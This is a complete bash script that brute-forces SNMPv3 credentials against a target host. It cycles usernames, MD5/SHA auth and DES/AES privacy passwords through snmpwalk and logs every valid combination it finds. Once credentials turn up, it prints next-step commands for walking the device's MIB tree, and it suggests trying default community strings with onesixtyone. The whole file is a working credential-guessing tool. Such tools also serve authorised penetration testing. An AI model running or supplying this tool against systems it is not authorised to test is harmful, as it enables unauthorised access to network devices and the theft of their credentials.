#!/bin/bash
###############################################################################
# snmpv3-brute.sh — SNMPv3 credential brute-forcer
#
# Usage:
#   ./snmpv3-brute.sh -t <target> -u <user|userfile> -p <passfile> [options]
#
# Examples:
#   ./snmpv3-brute.sh -t 10.1.249.41 -u waserby -p passwords.txt
#   ./snmpv3-brute.sh -t 10.1.249.41 -u users.txt -p passwords.txt --privfile priv.txt
#   ./snmpv3-brute.sh -t 10.1.249.41 -u waserby -p passwords.txt --auth-protos sha,md5
###############################################################################

set -euo pipefail

# ── Defaults ────────────────────────────────────────────────────────────────
TARGET=""
USERS=()
PASSFILE=""
PRIVFILE=""
AUTH_PROTOS=("MD5" "SHA")
PRIV_PROTOS=("DES" "AES")
OID="1.3.6.1.2.1.1.1.0"
TIMEOUT=3
RETRIES=0
THREADS=1
LOGFILE="snmpv3-brute-$(date +%Y%m%d-%H%M%S).log"
DELAY=0

# ── Colors ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'
GRN='\033[0;32m'
YEL='\033[0;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
RST='\033[0m'

# ── Usage ───────────────────────────────────────────────────────────────────
usage() {
    cat <<'EOF'
Usage: ./snmpv3-brute.sh -t <target> -u <user|userfile> -p <passfile> [options]

Required:
  -t, --target        Target IP or hostname
  -u, --user          Single username OR file of usernames (one per line)
  -p, --passfile      Password file (one per line)

Optional:
  --privfile           Priv password file for authPriv testing (skips authPriv if omitted)
  --auth-protos        Auth protocols, comma-separated (default: MD5,SHA)
  --priv-protos        Priv protocols, comma-separated (default: DES,AES)
  --oid                OID to query (default: sysDescr.0)
  --timeout            SNMP timeout in seconds (default: 3)
  --retries            SNMP retries (default: 0)
  --delay              Delay between attempts in seconds (default: 0)
  --threads            Parallel jobs — use with caution (default: 1)
  --logfile            Output log file (default: auto-timestamped)
  -h, --help           Show this help
EOF
    exit 0
}

# ── Parse args ──────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target)      TARGET="$2";                              shift 2 ;;
        -u|--user)        USER_INPUT="$2";                          shift 2 ;;
        -p|--passfile)    PASSFILE="$2";                            shift 2 ;;
        --privfile)       PRIVFILE="$2";                            shift 2 ;;
        --auth-protos)    IFS=',' read -ra AUTH_PROTOS <<< "$2";    shift 2 ;;
        --priv-protos)    IFS=',' read -ra PRIV_PROTOS <<< "$2";    shift 2 ;;
        --oid)            OID="$2";                                 shift 2 ;;
        --timeout)        TIMEOUT="$2";                             shift 2 ;;
        --retries)        RETRIES="$2";                             shift 2 ;;
        --delay)          DELAY="$2";                               shift 2 ;;
        --threads)        THREADS="$2";                             shift 2 ;;
        --logfile)        LOGFILE="$2";                             shift 2 ;;
        -h|--help)        usage ;;
        *)                echo "Unknown option: $1"; usage ;;
    esac
done

# ── Validate ────────────────────────────────────────────────────────────────
[[ -z "$TARGET" ]]    && { echo -e "${RED}[!] --target is required${RST}"; usage; }
[[ -z "$USER_INPUT" ]] && { echo -e "${RED}[!] --user is required${RST}"; usage; }
[[ -z "$PASSFILE" ]]  && { echo -e "${RED}[!] --passfile is required${RST}"; usage; }
[[ ! -f "$PASSFILE" ]] && { echo -e "${RED}[!] Password file not found: $PASSFILE${RST}"; exit 1; }

# Build user list: single user or file
if [[ -f "$USER_INPUT" ]]; then
    mapfile -t USERS < "$USER_INPUT"
else
    USERS=("$USER_INPUT")
fi

PASS_COUNT=$(wc -l < "$PASSFILE")
USER_COUNT=${#USERS[@]}
TOTAL_COMBOS=0
FOUND_COUNT=0

# ── Banner ──────────────────────────────────────────────────────────────────
echo ""
echo -e "${CYN}╔══════════════════════════════════════════════════════════╗${RST}"
echo -e "${CYN}║${RST}           ${BLU}SNMPv3 Credential Brute-Forcer${RST}               ${CYN}║${RST}"
echo -e "${CYN}╚══════════════════════════════════════════════════════════╝${RST}"
echo ""
echo -e "  ${BLU}Target:${RST}       $TARGET"
echo -e "  ${BLU}Users:${RST}        $USER_COUNT"
echo -e "  ${BLU}Passwords:${RST}    $PASS_COUNT"
echo -e "  ${BLU}Auth protos:${RST}  ${AUTH_PROTOS[*]}"
if [[ -n "$PRIVFILE" ]]; then
    PRIV_COUNT=$(wc -l < "$PRIVFILE")
    echo -e "  ${BLU}Priv protos:${RST}  ${PRIV_PROTOS[*]}"
    echo -e "  ${BLU}Priv passes:${RST} $PRIV_COUNT"
fi
echo -e "  ${BLU}Timeout:${RST}      ${TIMEOUT}s"
echo -e "  ${BLU}Log:${RST}          $LOGFILE"
echo ""

# ── Log header ──────────────────────────────────────────────────────────────
{
    echo "# SNMPv3 Brute-Force Log"
    echo "# Target:    $TARGET"
    echo "# Started:   $(date)"
    echo "# Users:     ${USERS[*]}"
    echo "# Passfile:  $PASSFILE"
    echo "---"
} > "$LOGFILE"

# ── Connectivity check ─────────────────────────────────────────────────────
echo -ne "  ${YEL}[*]${RST} Testing SNMP connectivity on $TARGET:161 ... "
if snmpwalk -v 3 -l noAuthNoPriv -u __probe__ -t 2 -r 0 "$TARGET" "$OID" &>/dev/null; then
    echo -e "${GRN}open (noAuth allowed — try noAuthNoPriv first!)${RST}"
    echo "[!] noAuthNoPriv may be enabled — test manually" >> "$LOGFILE"
elif timeout 3 bash -c "echo >/dev/udp/$TARGET/161" 2>/dev/null; then
    echo -e "${GRN}port open${RST}"
else
    echo -e "${YEL}no response (UDP — may still be open)${RST}"
fi

# ── Core brute function ────────────────────────────────────────────────────
try_snmp() {
    local user="$1" auth="$2" level="$3" authpass="$4"
    local priv="${5:-}" privpass="${6:-}"
    local cmd result

    if [[ "$level" == "authPriv" ]]; then
        cmd=(snmpwalk -v 3 -l authPriv -u "$user"
             -a "$auth" -A "$authpass"
             -x "$priv" -X "$privpass"
             -t "$TIMEOUT" -r "$RETRIES"
             "$TARGET" "$OID")
    else
        cmd=(snmpwalk -v 3 -l authNoPriv -u "$user"
             -a "$auth" -A "$authpass"
             -t "$TIMEOUT" -r "$RETRIES"
             "$TARGET" "$OID")
    fi

    result=$("${cmd[@]}" 2>&1)

    if echo "$result" | grep -qE "STRING|INTEGER|OID|Hex-|Counter|Gauge|Timeticks"; then
        return 0
    fi
    return 1
}

# ── Phase 1: authNoPriv ─────────────────────────────────────────────────────
echo ""
echo -e "  ${CYN}═══ Phase 1: authNoPriv ═══${RST}"
echo ""

ATTEMPT=0
PHASE1_TOTAL=$(( USER_COUNT * PASS_COUNT * ${#AUTH_PROTOS[@]} ))

for user in "${USERS[@]}"; do
    for auth in "${AUTH_PROTOS[@]}"; do
        while IFS= read -r pass || [[ -n "$pass" ]]; do
            ATTEMPT=$((ATTEMPT + 1))
            TOTAL_COMBOS=$((TOTAL_COMBOS + 1))

            # Progress (overwrite line)
            printf "\r  ${YEL}[*]${RST} [%d/%d] %-8s | %-4s | %-30s" \
                "$ATTEMPT" "$PHASE1_TOTAL" "$user" "$auth" "$pass"

            if try_snmp "$user" "$auth" "authNoPriv" "$pass"; then
                FOUND_COUNT=$((FOUND_COUNT + 1))
                echo ""
                echo -e "  ${GRN}[+] FOUND!  ${RST}${user} / ${auth} / authNoPriv"
                echo -e "  ${GRN}    Auth Password: ${RST}${pass}"
                echo ""

                # Grab the sysDescr for context
                sys_info=$(snmpwalk -v 3 -l authNoPriv -u "$user" \
                    -a "$auth" -A "$pass" -t "$TIMEOUT" \
                    "$TARGET" "$OID" 2>/dev/null | head -3)
                echo -e "  ${BLU}    sysDescr:${RST}"
                echo "$sys_info" | sed 's/^/      /'
                echo ""

                # Log it
                {
                    echo "[FOUND] authNoPriv"
                    echo "  User:     $user"
                    echo "  Auth:     $auth"
                    echo "  Password: $pass"
                    echo "  Response: $sys_info"
                    echo ""
                } >> "$LOGFILE"
            fi

            [[ "$DELAY" -gt 0 ]] && sleep "$DELAY"
        done < "$PASSFILE"
    done
done

printf "\r%-80s\r" ""  # clear progress line

# ── Phase 2: authPriv (if privfile provided) ────────────────────────────────
if [[ -n "$PRIVFILE" && -f "$PRIVFILE" ]]; then
    echo -e "  ${CYN}═══ Phase 2: authPriv ═══${RST}"
    echo ""

    ATTEMPT=0
    PHASE2_TOTAL=$(( USER_COUNT * PASS_COUNT * ${#AUTH_PROTOS[@]} * PRIV_COUNT * ${#PRIV_PROTOS[@]} ))

    for user in "${USERS[@]}"; do
        for auth in "${AUTH_PROTOS[@]}"; do
            while IFS= read -r pass || [[ -n "$pass" ]]; do
                for priv in "${PRIV_PROTOS[@]}"; do
                    while IFS= read -r privpass || [[ -n "$privpass" ]]; do
                        ATTEMPT=$((ATTEMPT + 1))
                        TOTAL_COMBOS=$((TOTAL_COMBOS + 1))

                        printf "\r  ${YEL}[*]${RST} [%d/%d] %-8s | %s/%s | auth:%-20s priv:%-20s" \
                            "$ATTEMPT" "$PHASE2_TOTAL" "$user" "$auth" "$priv" "$pass" "$privpass"

                        if try_snmp "$user" "$auth" "authPriv" "$pass" "$priv" "$privpass"; then
                            FOUND_COUNT=$((FOUND_COUNT + 1))
                            echo ""
                            echo -e "  ${GRN}[+] FOUND!  ${RST}${user} / ${auth} / ${priv} / authPriv"
                            echo -e "  ${GRN}    Auth Password: ${RST}${pass}"
                            echo -e "  ${GRN}    Priv Password: ${RST}${privpass}"
                            echo ""

                            {
                                echo "[FOUND] authPriv"
                                echo "  User:      $user"
                                echo "  Auth:      $auth / $pass"
                                echo "  Priv:      $priv / $privpass"
                                echo ""
                            } >> "$LOGFILE"
                        fi

                        [[ "$DELAY" -gt 0 ]] && sleep "$DELAY"
                    done < "$PRIVFILE"
                done
            done < "$PASSFILE"
        done
    done

    printf "\r%-100s\r" ""
fi

# ── Summary ─────────────────────────────────────────────────────────────────
echo ""
echo -e "${CYN}╔══════════════════════════════════════════════════════════╗${RST}"
echo -e "${CYN}║${RST}                      ${BLU}COMPLETE${RST}                           ${CYN}║${RST}"
echo -e "${CYN}╚══════════════════════════════════════════════════════════╝${RST}"
echo ""
echo -e "  ${BLU}Attempts:${RST}     $TOTAL_COMBOS"
echo -e "  ${BLU}Found:${RST}        $FOUND_COUNT"
echo -e "  ${BLU}Log:${RST}          $LOGFILE"
echo ""

if [[ "$FOUND_COUNT" -gt 0 ]]; then
    echo -e "  ${GRN}[+] Valid credentials saved to ${LOGFILE}${RST}"
    echo ""
    echo -e "  ${YEL}Next steps:${RST}"
    echo "    # Walk the full MIB tree"
    echo "    snmpwalk -v 3 -l authNoPriv -u <user> -a <proto> -A '<pass>' $TARGET"
    echo ""
    echo "    # Grab specific OIDs"
    echo "    snmpwalk -v 3 -l authNoPriv -u <user> -a <proto> -A '<pass>' $TARGET 1.3.6.1.4.1    # enterprise"
    echo "    snmpwalk -v 3 -l authNoPriv -u <user> -a <proto> -A '<pass>' $TARGET 1.3.6.1.2.1.25  # hrSystem"
    echo ""
else
    echo -e "  ${RED}[-] No valid credentials found${RST}"
    echo -e "  ${YEL}    Try a bigger wordlist or check if SNMPv1/v2c is enabled:${RST}"
    echo "    snmpwalk -v 2c -c public $TARGET"
    echo "    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET"
    echo ""
fi

{
    echo "---"
    echo "# Finished: $(date)"
    echo "# Attempts: $TOTAL_COMBOS"
    echo "# Found:    $FOUND_COUNT"
} >> "$LOGFILE"
